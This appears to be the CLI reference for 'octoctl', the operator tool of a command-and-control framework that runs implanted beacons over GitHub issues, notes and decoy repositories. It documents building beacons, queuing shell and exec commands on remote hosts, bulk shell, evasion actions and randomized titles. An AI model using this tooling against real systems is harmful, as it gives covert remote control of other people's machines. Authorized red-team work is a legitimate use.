# CLI Reference

`octoctl` is the operator interface for setup, enrollment, builds, tasking,
results, channel health, proxy routes, and local services.

> [!IMPORTANT]
> **Authorized use only.** CLI commands can change remote repositories and
> endpoint state. Verify the target and task risk before submission.

Run it from source:

```bash
cd octoctl
bun run src/index.ts --help
```

Examples below use `octoctl` as an alias for that command. Every command
supports `--help`.

## Operator environment

| Variable | Used for |
|---|---|
| `OCTOC2_SERVER_URL` | HTTPS controller origin for live operator commands |
| `OCTOC2_HTTP_CA_CERT` | CA file used to verify the controller certificate |
| `OCTOC2_OPERATOR_API_TOKEN` | Operator authentication to controller REST/SSE routes |
| `OCTOC2_OPERATOR_GITHUB_TOKEN` | Direct operator access to the configured GitHub repo |
| `OCTOC2_REPO_OWNER`, `OCTOC2_REPO_NAME` | Control repository coordinates |
| `OCTOC2_OPERATOR_SECRET` | Base64url X25519 secret for task/result cryptography |
| `OCTOC2_DATA_DIR` | Offline controller data directory (default `./data`) |

Prefer environment variables or protected files over command-line token
options, because process arguments may be observable by other local users.

## Setup and keys

### `setup`

Run the guided deployment workflow:

```bash
octoctl setup
octoctl setup --phase validate
```

Available phases are `credentials`, `validate`, `keygen`, `auth`, `tentacles`,
`env`, `build`, and `verify`. A phase is useful when revisiting one part of an
existing configuration.

### `keygen`

Generate an operator X25519 keypair:

```bash
octoctl keygen
octoctl keygen --set-variable
```

`--set-variable` writes the public key to the control repository's
`MONITORING_PUBKEY` Actions variable and requires the direct operator GitHub
credential. Store the printed secret outside source control.

## Beacon inventory and health

```bash
octoctl beacons
octoctl beacons --status active
octoctl beacons --json --data-dir /secure/octoc2-data
```

Status filters are `active`, `dormant`, and `lost`.

Inspect one beacon's channel activity from durable local state or the live API:

```bash
octoctl tentacles list --beacon <id-prefix>
octoctl tentacles health --beacon <id-prefix> --server-url https://controller.example:8080
octoctl tentacles list --beacon <id-prefix> --verbose --json
```

`health` is an alias for `list`. Observed activity is not proof that every
channel prerequisite is currently satisfied.

## Queue tasks

```bash
octoctl task <beacon-id> --kind ping
octoctl task <beacon-id> --kind shell --cmd "whoami"
octoctl task <beacon-id> --kind exec --args-json '{"cmd":"id","args":["-u"]}'
octoctl task <beacon-id> --kind sleep --seconds 300
octoctl task <beacon-id> --kind ping --tentacle notes
```

Use `--args-json` for advanced schemas. `--tentacle` pins the delivery attempt
to one selectable channel and is useful for qualification; omit it for normal
priority/failover behavior.

### Task catalog

| Kind | Risk | Required arguments | Purpose |
|---|---|---|---|
| `ping` | Routine | `{}` | Connectivity and process metadata probe |
| `sleep` | Routine | `seconds`; optional `jitter` | Change check-in timing |
| `shell` | Elevated | `cmd`; optional `cwd`, `timeout` | Run through the platform shell |
| `exec` | Elevated | `cmd`; optional `args`, `cwd`, `timeout` | Execute a program directly |
| `kill` | Destructive | `{}` | Terminate the beacon process |
| `evasion` | Destructive | Explicit action-specific schema | Invoke an implemented lifecycle/evasion action |

The shared validator rejects unknown fields, invalid types, non-finite values,
commands longer than 32 KiB, paths longer than 4 KiB, timeouts beyond five
minutes, and sleep values outside the accepted bounds. `load-module` is not an
accepted task kind.

Treat `shell`, `exec`, `kill`, and `evasion` as change-controlled operations.
Use `ping` for initial transport verification.

## Fetch results

```bash
octoctl results <beacon-id>
octoctl results <beacon-id> --last 5
octoctl results <beacon-id> --since 2h
octoctl results <beacon-id> --since 2026-07-17T12:00:00.000Z --json
```

The default window is 24 hours. Results returned by the controller have passed
its identity, ownership, signature, replay, and state checks.

## Interactive and bulk operation

```bash
octoctl beacon shell --beacon <id-prefix>
octoctl beacon shell --beacon <id-prefix> --tentacle notes --timeout 300
```

The interactive shell uses the authenticated controller HTTP API. It does not
create an unauthenticated terminal listener.

```bash
octoctl bulk shell \
  --beacon-ids <id-one>,<id-two> \
  --cmd "whoami" \
  --wait \
  --timeout 120
```

Bulk shell is elevated and targets every listed beacon. Review the expanded ID
set before submitting it.

## Build beacon

Simple mode compiles without baking an enrollment identity:

```bash
octoctl build-beacon --output ./beacon --platform linux-x64
```

Full mode generates/bakes the beacon ID, X25519 identity, Ed25519 signing
identity, and non-secret endpoint selection:

```bash
octoctl build-beacon \
  --outfile ./beacon-macos-arm64 \
  --target bun-darwin-arm64 \
  --tentacle-priority issues,notes
```

Key options:

| Option | Meaning |
|---|---|
| `--beacon-id <uuid>` | Use an approved pre-assigned ID instead of generating one |
| `--target <bun-target>` | Full-mode Bun compile target; default `bun-linux-x64` |
| `--relay <account/repo>` | Add a relay consortium entry; repeatable |
| `--grpc-url <host:port>` | Bake a direct TLS gRPC endpoint |
| `--http-url <https-url>` | Bake the direct HTTPS endpoint |
| `--codespace-name`, `--github-user` | Bake non-secret Codespaces discovery fields |
| `--tentacle-priority <list>` | Bake priority order |
| `--no-random-title` | Use the default Issues title rather than a randomized title |

Runtime PATs, bearer credentials, client private keys, and App private keys are
not build options. Supply them securely on the target.

## Recovery records

```bash
octoctl drop create \
  --beacon <id-prefix> \
  --configuration-file ./recovery-config.json \
  --generation 2 \
  --recovery-signing-secret-file /secure/recovery-signing.key

octoctl drop list --beacon <id-prefix>
```

Repository coordinates, ref, writer token, signing public key/key ID, issuance,
expiry, and data directory have explicit flags or documented environment
fallbacks. Follow [Recovery](RECOVERY.md); a hand-authored partial record will
be rejected.

## Proxy routes

```bash
octoctl proxy create \
  --decoy-repo <owner/decoy> \
  --beacon <id-prefix> \
  --ctrl-owner <owner> \
  --ctrl-repo <control> \
  --proxy-installation-id <number>

octoctl proxy templates
octoctl proxy list
octoctl proxy rotate <beacon-id> '<new-route-json>'
```

`proxy create` can add `--create-repo` and `--scaffold`. Dispatch tokens and the
stable relay signing key should come from protected environment variables. See
the [proxy workflow contract](../templates/proxy/README.md).

## Local service commands

```bash
octoctl start --env .env
octoctl start server --env .env
octoctl status
octoctl stop dashboard
octoctl stop
octoctl update --branch main
```

`start` manages local background processes; it is not a production service
manager. `update` pulls the named branch and reinstalls dependencies, so review
local changes and upstream changes before using it.

## Output and exit behavior

Use `--json` where offered for automation. Successful commands exit `0`.
Validation, configuration, API, and filesystem failures exit non-zero and emit
an actionable message. Never parse human-oriented tables when JSON output is
available.
